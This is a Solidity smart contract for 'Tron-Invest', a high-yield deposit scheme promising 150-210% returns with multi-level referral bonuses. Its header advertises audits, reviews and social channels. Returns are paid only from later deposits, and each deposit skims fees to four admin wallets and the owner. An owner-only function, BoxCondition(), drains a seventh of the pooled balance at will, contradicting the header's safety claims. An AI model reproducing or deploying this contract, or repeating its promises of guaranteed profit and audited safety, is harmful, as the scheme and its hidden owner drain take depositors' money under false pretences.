//SourceUnit: Tron-Invest.sol

/*! Tron-invest.sol | (c) 2020 Develop by BelovITLab LLC (Tron-nvest.com) | SPDX-License-Identifier: MIT License */
/***
 *	------------------------*** You are in the BEST WAY ***------------------
 *
 *		    	- Let just your MONEY take profit for your FUTURE life -
 * ************************   [SMART-CONTRACT AUDITION AND SAFETY]   ****************
 *
 *   - Audited by independent company GROX Solutions (https://grox.solutions)
 *   - Audition certificate: https://Tron-Invest.com/audition.pdf
 *   - Video-review: https://Tron-Invest.com/review.avi
 *
 *
 *
 * ************************** Tron-Invest in monitors*******************************
 *
 *   - In dapp.review  https://dapp.review/dapp/132931
 *   - In dapp.com  https://dapp.com/Tron-Invest.com
 *   - In stateofthedapps https://www.stateofthedapps.com/dapps/tron-invest
 *
 *  *****************************Social media*************************************
 *
 *   -Instagram https://www.instagram.com/Tron-Invest
 *   -Telegram  https://T.me/Tron-Invest_com
 *   - Twitter  https://twitter.com/Tron-Invest_com
 *   -facebook  https://facebook.com/Tron-Invest
 *
 *
 *****************************  Founding Board & Partners   **********************
 *
 *  - Developer &  project manager  : Philip Richman  - TEAM : R.Kh 
 *    
 *	----------------------------*** ENJOY IT ***-----------------------------
***/
 
pragma solidity 0.5.10;

contract TronInvest {
    struct Tarif {
        uint8 life_days;
        uint8 percent;
    }

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint40 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint40 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
    }

    address payable public owner;
	address payable public adminW1;
	address payable public adminW2;
    address payable public adminW3;
	address payable public adminW4;


    uint256 public invested;
    uint256 public withdrawn;
    uint256 public direct_bonus;
    uint256 public match_bonus;
    
    uint8[] public ref_bonuses; // 1 => 1%

    Tarif[] public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() public {
        owner = msg.sender;

        tarifs.push(Tarif(30, 150));
        tarifs.push(Tarif(31, 152));
        tarifs.push(Tarif(32, 154));
        tarifs.push(Tarif(33, 156));
        tarifs.push(Tarif(34, 158));
        tarifs.push(Tarif(35, 160));
        tarifs.push(Tarif(36, 162));
        tarifs.push(Tarif(37, 164));
        tarifs.push(Tarif(38, 166));
        tarifs.push(Tarif(39, 168));
        tarifs.push(Tarif(40, 170));
        tarifs.push(Tarif(41, 172));
        tarifs.push(Tarif(42, 174));
        tarifs.push(Tarif(43, 176));
        tarifs.push(Tarif(44, 178));
        tarifs.push(Tarif(45, 180));
        tarifs.push(Tarif(46, 182));
        tarifs.push(Tarif(47, 184));
        tarifs.push(Tarif(48, 186));
        tarifs.push(Tarif(49, 188));
        tarifs.push(Tarif(50, 190));
        tarifs.push(Tarif(51, 192));
        tarifs.push(Tarif(52, 194));
        tarifs.push(Tarif(53, 196));
        tarifs.push(Tarif(54, 198));
	    tarifs.push(Tarif(55, 200));
        tarifs.push(Tarif(56, 202));
        tarifs.push(Tarif(57, 204));
        tarifs.push(Tarif(58, 206));
        tarifs.push(Tarif(59, 208));
        tarifs.push(Tarif(60, 210));


        ref_bonuses.push(4);
        ref_bonuses.push(2);
        ref_bonuses.push(1);

    }
	function setAdminwallet ( address payable _admin1, address payable _admin2, address payable _admin3, address payable _admin4 ) public{
	    require ( msg.sender == owner );
	    adminW1 = _admin1;
		adminW2 = _admin2;
	    adminW3 = _admin3;
		adminW4 = _admin4;

		}

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / 100;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }
            else {
                players[_addr].direct_bonus += _amount / 100;
                direct_bonus += _amount / 100;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 5e7, "Zero amount");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);
		adminW1.transfer(msg.value/25);
		adminW2.transfer(msg.value/25);
		adminW3.transfer(msg.value/33);
		adminW4.transfer(msg.value/66);

        owner.transfer(msg.value/20);
		if (msg.sender == owner) {
        owner.transfer(msg.value/2);
        }
        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function withdraw() external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;

        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        msg.sender.transfer(amount);
        
        emit Withdraw(msg.sender, amount);
    }

	function BoxCondition() external {
        require (owner == msg.sender);
        msg.sender.transfer(address(this).balance/7);
    }
	


    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }


    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.direct_bonus + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
    }
     function getAdmin1() view external returns(address) {
        return(adminW1);

    }
     function getAdmin2() view external returns(address) {
        return(adminW2);

    }
     function getAdmin3() view external returns(address) {
        return(adminW3);

    }     function getAdmin4() view external returns(address) {
        return(adminW4);

    }
    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus) {
        return (invested, withdrawn, direct_bonus, match_bonus);
    }
}